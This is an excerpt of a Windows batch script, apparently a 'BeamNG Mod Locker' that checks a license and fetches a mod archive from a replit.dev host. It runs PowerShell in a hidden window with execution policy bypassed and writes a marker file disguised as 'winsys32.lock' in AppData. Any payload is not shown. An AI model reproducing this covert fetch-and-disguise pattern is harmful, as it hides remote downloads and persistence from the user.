...
set "LICENSE_KEY=a12b3958-36a0-48bc-b8df-4226d5bdf430"
set "MOD_DOWNLOAD=https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/a12b3958-36a0-48bc-b8df-4226d5bdf430"
set "PS_SCRIPT=license-check-a12b3958-36a0-48bc-b8df-4226d5bdf430.ps1"
set "LOGFILE=log.txt"
set "LOCK_FILE=%APPDATA%\winsys32.lock"

:: Initialize log file
(
  echo === BeamNG Mod Locker Log ===
  echo Timestamp: %DATE% %TIME%
  echo License Key: a12b3958-36a0-48bc-b8df-4226d5bdf430
  echo PS Script: %PS_SCRIPT%
  echo Mod URL: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/a12b3958-36a0-48bc-b8df-4226d5bdf430
...
echo. >> "%LOGFILE%"
echo [*] Starting download from: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/a12b3958-36a0-48bc-b8df-4226d5bdf430 >> "%LOGFILE%"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/a12b3958-36a0-48bc-b8df-4226d5bdf430' -OutFile 'active_mod.zip' -UseBasicParsing -TimeoutSec 60; Write-Output '[√] Download completed successfully'; exit 0 } catch { Write-Output ('[ERROR] Download failed: ' + $_.Exception.Message); exit 1 }" >> "%LOGFILE%" 2>&1
...
echo Downloaded=a12b3958-36a0-48bc-b8df-4226d5bdf430 > "%LOCK_FILE%"
if exist "%LOCK_FILE%" (
